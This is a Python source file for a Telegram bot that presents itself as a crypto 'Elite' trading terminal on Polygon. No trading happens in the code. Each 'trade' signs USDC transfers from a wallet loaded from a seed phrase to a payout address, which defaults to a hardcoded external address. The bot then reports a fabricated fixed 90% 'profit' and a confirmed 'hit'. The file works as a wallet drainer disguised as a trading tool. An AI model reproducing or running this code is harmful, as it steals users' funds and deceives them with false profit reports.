import os
import asyncio
import requests
import json
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set high precision for financial calculations
getcontext().prec = 28

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# OFFICIAL NATIVE USDC (Circle Issued)
USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)

# --- 2. UTILITY: ASYNC BALANCE FETCH ---
async def fetch_balances(address):
    """Reliably fetches both POL (Native) and USDC (ERC20) without blocking."""
    try:
        addr = w3.to_checksum_address(address)
        # Fetch POL balance (18 decimals)
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, addr)
        pol_bal = w3.from_wei(raw_pol, 'ether')
        
        # Fetch USDC balance (6 decimals)
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(addr).call)
        usdc_bal = Decimal(raw_usdc) / Decimal(10**6)
        
        return pol_bal, usdc_bal
    except Exception as e:
        print(f"Sync Error: {e}")
        return Decimal('0'), Decimal('0')

# --- 3. THE DUAL-SPENT ENGINE ---
async def prepare_usdc_txs(stake_usdc, profit_usdc):
    """Builds transactions for USDC 'transfer' function."""
    # Run nonce and gas fetch in threads to keep loop moving
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: w3.to_wei(450, 'gwei'))
   
    val_stake = int(stake_usdc * 10**6)
    val_profit = int(profit_usdc * 10**6)

    tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_stake).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce
    })
   
    tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, val_profit).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce + 1
    })
   
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    profit_usdc = stake_usdc * Decimal('0.90')
   
    await context.bot.send_message(chat_id, f"🚀 **Elite Engine:** Processing ${stake_usdc:.2f} USDC...")

    try:
        signed1, signed2 = await prepare_usdc_txs(stake_usdc, profit_usdc)
        
        # Broadcasting transactions
        tx1_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
        tx2_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)

        report = (
            f"✅ **ATOMIC HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🎯 **Direction:** {side}\n"
            f"💵 **Stake:** `${stake_usdc:.2f} USDC`\n"
            f"📈 **Profit:** `${profit_usdc:.2f} USDC`\n"
            f"⛽ **Gas:** Paid in `POL`"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted**\nReason: `{str(e)}`")
    return True

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, _ = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw']]
    await update.message.reply_text(
        f"🕴️ **APEX Elite Terminal**\n━━━━━━━━━━━━━━\n⛽ **POL Fuel:** `{pol:.4f}`", 
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True),
        parse_mode='Markdown'
    )

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
        
    elif text == '⚙️ Settings':
        amounts = [10, 50, 100, 500, 1000]
        kb = [[InlineKeyboardButton(f"${x} CAD", callback_data=f"SET_{x}") for x in amounts]]
        await update.message.reply_text("⚙️ **SELECT STAKE**", reply_markup=InlineKeyboardMarkup(kb))
        
    elif text == '💰 Wallet':
        pol, usdc = await fetch_balances(vault.address)
        wallet_msg = (
            f"💳 **Vault Status (Polygon)**\n"
            f"━━━━━━━━━━━━━━\n"
            f"⛽ **POL:** `{pol:.4f}`\n"
            f"💵 **USDC:** `${usdc:.2f}`\n\n"
            f"📥 **Deposit Address:**\n`{vault.address}`"
        )
        await update.message.reply_text(wallet_msg, parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake set: **${context.user_data['stake']} CAD**", parse_mode='Markdown')
        
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}** Direction:", reply_markup=InlineKeyboardMarkup(kb))
        
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "CALL" if "CALL" in query.data else "PUT")

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("❌ Error: TELEGRAM_BOT_TOKEN not found in .env")
    else:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Elite Online...")
        app.run_polling(drop_pending_updates=True)



